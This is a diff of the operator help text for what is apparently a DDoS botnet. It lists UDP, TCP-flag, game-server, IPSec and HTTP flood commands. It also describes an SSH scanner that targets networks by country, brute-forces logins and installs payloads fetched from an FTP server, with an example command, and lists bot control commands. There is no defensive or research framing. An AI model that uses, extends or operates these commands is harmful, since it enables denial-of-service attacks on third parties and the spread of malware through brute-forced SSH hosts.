@@ -2,40 +2,42 @@ ATTACK VECTORS:
 	
         # Min and Max of attack size will be 50 - 1400 bytes. If you put over or lower size it will set to 100 automatically.
         
-	# Tip: you can use "-r" command for random dst port and src IP, but it can only use with these arg!!!
+	# Tip: you can use "-r" command for random dst ports and src IPs, but it can only use with these 2 args!!!
 	# Example: ?tcp -fin -r 192.168.50.129 -r 100
 
 	?udp <src> <dst> <port> <size>                Just a normal UDP flood attack.
-	?tcp <flags> <src> <dst> <port> <size>	      TCP flood with customize flags.
-	
-		-syn            TCP flood with syn packet, just a normal syn flood
-		-ack		TCP flood with ack packet, just a normal ack flood
-		-psh		TCP flood with psh packet, just a normal psh flood
-		-urg		TCP flood with urg packet, just a normal urg flood
+	?tcp <flag> <src> <dst> <port> <size>	      TCP flood with customize flag.
+
+		-syn            TCP flood with syn packet, just a normal syn flood.
+		-ack		TCP flood with ack packet, just a normal ack flood.
+		-psh		TCP flood with psh packet, just a normal psh flood.
+		-urg		TCP flood with urg packet, just a normal urg flood.
 		-rst		TCP flood with rst packet, for broke a TCP connection between client and target server.
 		-fin		TCP flood with fin packet, for request close connection when target server are blocking a syn packet.
-		
-	?saf <src> <dst> <port> <size>		      Flood by using TCP SYN+ACK Flags to the target server.
-	?paf <src> <dst> <port> <size>		      Flood by using TCP PSH+ACK Flags to the target server.
-	?xmas <src> <dst> <port> <size>		      Flood TCP packets by using all of TCP Flags to target server.
+
+	?saf <src> <dst> <port> <size>                Flood by using TCP SYN+ACK flags to the target server.
+	?xmas <src> <dst> <port> <size>		      Flood TCP packets by using all of TCP flags to target server.
 	?vse <src> <dst>			      Flood TSource Engine Query request to the target game server that used valve source engine.
 	?fms <src> <dst>			      Flood query payload to a FiveM game server.
 	?ipsec <src> <dst>			      Flood payload to overwhelm system resources of VPN service and make IPSec VPN connections being affected.
-	?poling <url>			      	      Flood HTTP post login request to the target login web page. didn't do any of ip spoofing!!!
-	?get <url>			      	      Flood HTTP get request to the target website. didn't do any of ip spoofing!!!
+	?poling <url>			      	      Flood HTTP post login requests to the target login web page, didn't do any of ip spoofing!!!
+	?jumbo <url>				      Flood HTTP post request with a big XML payload, didn't do any of ip spoofing!!!
+	?get <url>			      	      Flood HTTP get requests to the target website, didn't do any of ip spoofing!!!
 
 SCAN FUNCTION:
 
-	?scan <network> <server>		Scan default SSH port on network. Brute-force attack to the target and install payload by using "wget".
+	?scan <network> <default> <mips>                Scan default SSH port on network, brute-force attack and exploit to the target.
 
 		-cn		Scan on china network.
 		-hk		Scan on hong kong network.
 		-kr		Scan on south korea network.
 		-br		Scan on brazil network.
-		-r		Scan with random ip.
+		-r		Scan with random IPs.
+
+	# Example: ?scan -r ftp://192.168.40.14/bin/payload_x32 ftp://192.168.40.14/bin/payload_mips_x32
 		
-?update <payload> <server>		Update bot source code or adapt it as a service.
-?info					Get bot system information, for bot analysis.
-?kill					Bot self-close.
-?stopddos 				Stop DDoS attacking.
-?stopscan				Stop scanning.
+?update <default> <mips>                Update bot source code or adapt it as a service.
+?info				        Get bot system information, for bot analysis and etc.
+?kill				        Bot self-close.
+?stopddos 			        Stop DDoS attacking.
+?stopscan			        Stop scanning.
